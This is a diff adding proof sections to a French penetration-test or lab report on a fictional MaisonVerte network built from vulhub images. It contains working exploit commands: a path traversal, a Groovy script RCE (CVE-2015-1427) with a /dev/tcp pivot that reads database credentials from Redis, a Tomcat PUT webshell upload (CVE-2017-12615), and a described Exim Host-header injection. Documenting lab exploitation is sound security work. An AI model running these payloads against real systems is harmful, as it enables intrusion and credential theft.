@@ -197,7 +197,7 @@ pre.small { font-size: 7.6pt; background: #fbfbfd; border: 0.75pt solid #e2e3ee;
 <div class="sec-rule"></div>
 
 <h3>Chaîne A — cache public → recherche → sessions → commandes</h3>
-<p><code>E2 → E7 → E8 → E10</code> — <b>3/4 étapes rejouées avec preuve réelle</b> le 16/09/2026 (détail complet : <code>documentation/04-exploitation.md</code>).</p>
+<p><code>E2 → E7 → E8 → E10</code> — <b>3/4 étapes rejouées avec preuve réelle</b> le 16/09/2026, depuis le VPN (source <code>10.200.0.67</code>).</p>
 <table>
 <tr><th>Étape</th><th>Précondition</th><th>Résultat obtenu</th><th>Mène à</th></tr>
 <tr><td>E2</td><td><code>cache.maisonverte.fr</code> publié via NAT E2</td><td>Traversal <code>/files../</code> → lecture du runbook, révèle route + jeton de recherche</td><td>E7</td></tr>
@@ -206,8 +206,37 @@ pre.small { font-size: 7.6pt; background: #fbfbfd; border: 0.75pt solid #e2e3ee;
 <tr><td>E10</td><td>Credential E8 obtenu</td><td class="pending">En cours (équipe attaque) — accès réseau E8→E10 confirmé disponible</td><td>fin de chaîne</td></tr>
 </table>
 
+<p class="small"><b>Preuve 1 — E2, traversal :</b></p>
+<pre class="small">$ curl -sk --resolve cache.maisonverte.fr:443:10.85.4.10 \
+    "https://cache.maisonverte.fr/files../srv/maisonverte/runbook/runbook.txt"
+
+MaisonVerte - runbook recherche produits
+Route interne: /internal/search/_search
+En-tete requis: X-MV-Search-Token: mv-search-a7-route
+Backend attendu: search-srv01:9200</pre>
+
+<p class="small"><b>Preuve 2 — E7, RCE Groovy (CVE-2015-1427) :</b></p>
+<pre class="small">$ curl -sk -H "X-MV-Search-Token: mv-search-a7-route" -H "Content-Type: application/json" \
+    --resolve cache.maisonverte.fr:443:10.85.4.10 \
+    -d '{"size":1,"script_fields":{"lupin":{"lang":"groovy",
+         "script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}' \
+    "https://cache.maisonverte.fr/internal/search/_search"
+
+"fields":{"lupin":["uid=0(root) gid=0(root) groups=0(root)\n"]}</pre>
+
+<p class="small"><b>Preuve 3 — E7 → E8, pivot réseau (<code>/dev/tcp</code> via la RCE Groovy) et lecture Redis :</b></p>
+<pre class="small">$ curl [...] -d '{"script_fields":{"lupin":{"lang":"groovy","script":
+    "[\"bash\",\"-c\",\"exec 3<>/dev/tcp/cache-srv01/6379; echo GET maisonverte:chain:a:e10:libpq >&3; timeout 1 cat <&3\"].execute().text"}}}' \
+    "https://cache.maisonverte.fr/internal/search/_search"
+
+$114
+host=catalog-data01 port=5432 dbname=maisonverte user=mv_catalog_admin password='Z/hO&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;Dt/L'</pre>
+<p class="small">(mot de passe masqué — valeur complète uniquement dans <code>deploiement/state/secrets/</code> sur <code>vulndb</code>, jamais dans Git ni ce document.)</p>
+
+<p class="small"><b>Vérification d'isolation (défense) :</b> depuis le shell RCE sur E7, tentative de connexion directe à <code>catalog-data01:5432</code> → <code>UNREACHABLE</code>. Confirmé par <code>docker network inspect</code> : <code>search-srv01</code> n'est pas sur <code>mv-a-data</code> (contrairement à <code>cache-srv01</code>) — la segmentation « aucun N3 direct hors du bon pivot » est respectée.</p>
+
 <h3>Chaîne B — portail vendeurs → CI/CD → batch → clients</h3>
-<p><code>E5 → E14 → E12 → E11</code> — E5 exploité avec preuve réelle ; suite bloquée par une incompatibilité Java (voir note).</p>
+<p><code>E5 → E14 → E12 → E11</code> — E5 exploité avec preuve réelle ; suite bloquée par une incompatibilité Java (voir preuve 3).</p>
 <table>
 <tr><th>Étape</th><th>Précondition</th><th>Résultat obtenu</th><th>Mène à</th></tr>
 <tr><td>E5</td><td><code>vendeurs.maisonverte.fr</code> publié via E2</td><td>PUT JSP (CVE-2017-12615) confirmé → webshell, RCE <code>id</code> → <code>uid=0(root)</code></td><td>E14</td></tr>
@@ -216,8 +245,26 @@ pre.small { font-size: 7.6pt; background: #fbfbfd; border: 0.75pt solid #e2e3ee;
 <tr><td>E11</td><td>Credential E12</td><td class="pending">à renseigner</td><td>fin de chaîne</td></tr>
 </table>
 
+<p class="small"><b>Preuve 1 — E5, PUT JSP (CVE-2017-12615), écriture d'un webshell :</b></p>
+<pre class="small">$ curl -sk -X PUT --resolve vendeurs.maisonverte.fr:443:10.85.4.10 \
+    --data-binary @shell.jsp "https://vendeurs.maisonverte.fr/mvshell.jsp/"
+
+HTTP 201</pre>
+
+<p class="small"><b>Preuve 2 — E5, confirmation d'exécution de commande :</b></p>
+<pre class="small">$ curl -sk --resolve vendeurs.maisonverte.fr:443:10.85.4.10 \
+    "https://vendeurs.maisonverte.fr/mvshell.jsp?cmd=id"
+
+uid=0(root) gid=0(root) groups=0(root)</pre>
+
+<p class="small"><b>Preuve 3 — E5 → E14, blocage :</b> la page d'accueil E5 indique <i>« synchronisation assurée par deploy-srv01 »</i> (indice Jenkins). Téléchargement du CLI Jenkins réussi, mais :</p>
+<pre class="small">Exception in thread "main" java.lang.UnsupportedClassVersionError: hudson/cli/CLI has been
+compiled by a more recent version of the Java Runtime (class file version 55.0), this version
+of the Java Runtime only recognizes class file versions up to 52.0</pre>
+<p class="small">E5 n'a que Java 8 (<code>1.8.0_141</code>) ; le CLI Jenkins 2.441 exige Java 11+. Contournement testé (conteneur jetable basé sur l'image <code>vulhub/jenkins:2.441</code>, qui embarque Java 17, sur le réseau <code>mv-b-edge</code>) : la commande CLI utilisée (<code>connect-node</code>) échoue avec <code>No such agent ... exists</code> — la syntaxe exacte pour déclencher la lecture de fichier CVE-2024-23897 reste à ajuster.</p>
+
 <h3>Chaîne C — boutique → back-office → fichiers → entrepôt</h3>
-<p><code>E3 → E6 → E9 → E13</code> — <b>arrêtée à l'étape E3</b> le 16/09/2026 (détail complet : <code>documentation/04-exploitation.md</code>).</p>
+<p><code>E3 → E6 → E9 → E13</code> — <b>arrêtée à l'étape E3</b> le 16/09/2026.</p>
 <table>
 <tr><th>Étape</th><th>Précondition</th><th>Résultat obtenu</th><th>Mène à</th></tr>
 <tr><td>E3</td><td><code>shop.maisonverte.fr</code> publié via E2</td><td>Indice back-office trouvé par simple lecture du site (article public, sans exploit). Exploitation pwnscriptum tentée (injection Host/PHPMailer-Exim) mais non concluante après plusieurs essais.</td><td>E6</td></tr>
@@ -225,7 +272,15 @@ pre.small { font-size: 7.6pt; background: #fbfbfd; border: 0.75pt solid #e2e3ee;
 <tr><td>E9</td><td>—</td><td class="pending">Non atteint</td><td>E13</td></tr>
 <tr><td>E13</td><td>—</td><td class="pending">Non atteint</td><td>fin de chaîne</td></tr>
 </table>
-<p class="pending">Blocage documenté : le vecteur pwnscriptum ne déclenche pas l'exécution attendue sur cette image (hypothèses : MTA incompatible avec la syntaxe Exim utilisée, timing de queue mail). Piste à reprendre pour débloquer la suite de la chaîne.</p>
+
+<p class="small"><b>Preuve 1 — E3, reconnaissance sans exploit :</b></p>
+<pre class="small">$ curl -sk --resolve shop.maisonverte.fr:443:10.85.4.10 "https://shop.maisonverte.fr/"
+
+[Article public "Operations boutique MaisonVerte"]
+Le back-office logistique communique avec backoffice-srv01 sur le segment prive.</pre>
+
+<p class="small"><b>Preuve 2 — E3, tentative pwnscriptum (échec) :</b> injection d'une commande dans l'en-tête <code>Host</code> via <code>POST /wp-login.php?action=lostpassword</code> (syntaxe d'expansion Exim <code>${run{...}}</code>). L'étape « téléchargement » a été envoyée (HTTP 500/302) mais aucune trace du fetch côté serveur hébergeant le payload sur un test propre ; l'étape « exécution » (<code>/bin/bash</code> puis <code>/bin/sh</code>) n'a produit aucun effet observable après plusieurs essais.</p>
+<p class="small">Hypothèses non vérifiées : MTA du conteneur WordPress incompatible avec la syntaxe Exim utilisée, timing de la queue mail, précondition manquante propre à l'image <code>vulhub/wordpress:4.6</code>. Piste à reprendre par l'équipe.</p>
 </div>
 
 <div class="sec">
